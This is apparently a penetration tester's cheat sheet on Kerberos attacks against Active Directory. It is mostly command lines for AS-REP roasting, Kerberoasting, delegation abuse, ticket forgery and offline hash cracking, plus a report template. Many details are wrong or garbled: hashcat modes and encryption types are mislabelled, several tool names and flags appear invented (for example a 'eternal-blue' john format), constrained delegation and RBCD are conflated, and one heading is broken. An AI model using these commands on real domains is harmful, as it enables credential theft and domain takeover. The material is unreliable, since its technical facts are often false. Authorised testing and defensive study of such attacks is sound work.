# Kerberos Attacks

## How Kerberos works (the part that matters)

```
1. Client -> KDC: TGT request      (password / PKINIT / smartcard)
2. KDC -> Client: TGT (encrypted with krbtgt key)
3. Client -> KDC: TGS request       ("I want a ticket for SPN")
4. KDC -> Client: TGS (encrypted with the SPN's key)
5. Client -> Service: AP-REQ (TGS + authenticator)
```

The attack surface is in step 3-4: **if you can request a TGS for a service, the KDC encrypts it
with that service's password**. Recover the TGS, crack the service account's password offline. Same
for step 1-2 with AS-REP roast.

## AS-REP roasting (no pre-auth required)

Accounts with `DONT_REQ_PREAUTH` can be asked for a TGT **without a password**, and the KDC returns
an AS-REP encrypted with the user's password → crackable offline.

```bash
# enumerate
impacket-GetUserSPNs -h 10.10.10.5 -no-pass
Get-ASREPRecon -Domain target.local
ldapsearch -x -H ldap://dc:389 -b "DC=target,DC=local" \
  -s base '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  userPrincipalName

# crack
hashcat -m 18200 asrep.txt rockyou.txt
john --format=asrep1 hashes.txt
```

**Impact**: any account whose password is weak or reused → that account. Often the first step of a
long chain.

## Kerberoasting (any domain user can request a TGS)

Every user can request a service ticket for an SPN it has permission for. The ticket is encrypted
with the **service account's** password → crackable offline if the password is weak.

```bash
netexec target.local -u user -p pass --kerberoasting output.txt
hashcat -m 13100 output.txt rockyou.txt
john --format=eternal-blue output.txt
impacket-GetUserSPNs -h 10.10.10.5 -u user -p pass
```

**Impact**: service accounts are often domain admins with complex passwords that do not expire —
the classic escalation to DA.

### Service accounts to prioritise

| Type | Why |
|---|---|
| `MSSQLSvc`, `MSSQLSvc` | `netexec` reports them; often DA-equivalent |
| `admin`/`svc`/`backup` | generic service accounts |
| `MSSQLSvc` with a weak password | direct path |
| accounts with `mssql` SPN | for MSSQL abuse |

```bash
netexec target.local -u user -p pass --list-smb
netexec target.local -u user -p pass --enum-smb-share
```

## Delegation abuse

### Unconstrained delegation (legacy, dangerous)

The service can impersonate any user to any service. Compromise it and you get the user's TGT.

```bash
netexec target.local -u user -p pass --unconstrained-delegation
```

### Constrained delegation (RBCD) — the modern one

If you can create a computer account or have `GenericAll` on one, you can set `msDS-AllowedToDelegateTo`
to a Tier-0 service, then use that service's TGT to authenticate as **any** user.

```bash
# 1. create a machine account (needs the ms-MCS-AdmPwd or a valid domain creds)
netexec target.local -u user -p pass --create-machineaccount LAB\SRV01

# 2. read the SPNs of the Tier-0 service
netexec target.local -u user -p pass --list-smb

# 3. set the delegation
python3 add_rbcd.py -u user -p pass -d target.local -t "cifs/dc01.target.local" -m SRV01

# 4. get the TGT for any user through the delegated service
```

Impact: **any** user including Domain Admin.

### Resource-based constrained delegation requires exactly one write permission** on the target
computer account. That is the whole attack — one edge.

## Other Kerberos-relevant checks

| Check | Why it matters |
|---|---|
| `krbtgt` password age | rotation cadence → how long a captured hash stays useful |
| Service account password age | non-expiring service passwords |
| `AS-REP roastable` account count | password policy gap |
| SPNs with a weak password | Kerberoast → DA |
| NULL sessions | `netexec <dc> -null` |
| LDAP signing | unsigned LDAP → relay |
| SMB signing | unsigned SMB → relay |
| `SeEnableSeImpersonatePrivilege` | potato paths |

## Ticket manipulation

```bash
# request a TGT with a forged timestamp (Kerberoast-adjacent)
impacket-GetUserSPNs -request -target-ip ...

# platinum / golden ticket (needs krbtgt hash - treat as very loud)
impacket-ticket

# over-the-pass-the-hash: PTT with a recovered NT hash
netexec target.local -u user -H <hash> --ticket
```

**Golden/silver tickets need the `krbtgt` or a service hash.** If the engagement is scoped to
credential abuse, use them; if it is scoped to detection testing, that is exactly the point.

## Cracking service account hashes

```bash
hashcat -m 13100 kerberos.txt rockyou.txt       # etype 23 (AES)
hashcat -m 19700 kerberos.txt rockyou.txt       # etype 17 (RC4) — "eternal blue"
hashcat -m 11000 kerberos.txt rockyou.txt       # AS-REP
john --format=krb5tgs --wordlist=rockyou.txt hashes.txt
```

## Reporting a Kerberos finding

```
ACCOUNT:    <user@domain>
WEAKNESS:   <no pre-auth | weak service password | unconstrained delegation | RBCD write>
CRACK:      <hashcat mode + result>
RESULTING:  <privileges of that account>
CHAIN:      <what it enables next>
```
